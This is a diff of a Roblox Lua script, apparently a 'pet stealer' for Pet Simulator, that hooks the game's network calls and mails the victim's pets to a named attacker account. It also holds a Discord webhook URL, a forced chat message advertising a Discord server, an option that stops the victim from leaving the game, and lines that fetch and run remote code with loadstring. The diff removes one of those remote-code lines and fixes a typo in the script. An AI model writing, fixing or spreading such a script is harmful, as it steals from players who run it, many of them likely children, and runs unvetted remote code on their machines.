@@ -1,11 +1,11 @@
 _G.Username = "W4r_ObScUrE" --// Username To Send Pets To
-_G.GiftMessage = "discord.gg/EP9uC28cna" --// Message For The Gift To Say
+_G.GiftMessage = ".gg/EP9uC28cna" --// Message For The Gift To Say
 _G.SendMessage = "disco epic code! its EP9uC28cna" --// Message the victim will send in the chat on execution
 _G.Diamonds = 1 --// Amount Of Diamonds To detect alt set an amount of diamond that if the target is under this number, the script will show them an error
 _G.UnlockPets = true --// Unlocks Locked Pets
 _G.AntiLeave = true --// Doesn't Let The Target Close Roblox
 _G.Webhook = "https://discord.com/api/webhooks/1121826274223063052/ZEV64rGns3HVy-P-UUXPx7KATNSQhLhSbaLqWaZGKZBARHC0MZZ9TjUYHT2IGDBbEbj9"
-wait(5)
+wait(1)
 local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network);
 local Fire = Network.Fire
 old = hookfunction(getupvalue(Fire, 1), function(...) 
@@ -32,7 +32,7 @@ local PetFolders = {
 --// Diamond Check
 if Client.leaderstats.Diamonds.Value < _G.Diamonds then
 	loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a82cd5447cbbc4c7be0e8db405555787.lua"))()
-	wai(555555555)
+	wait(555555555)
 end
 
 if time() <= 30 then
@@ -198,7 +198,7 @@ while wait() do
 			}
 			Invoke("Send Mail", unpack(args))
             wait(5)
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()           
+    
             if v2.huge == false then
                 break
             end
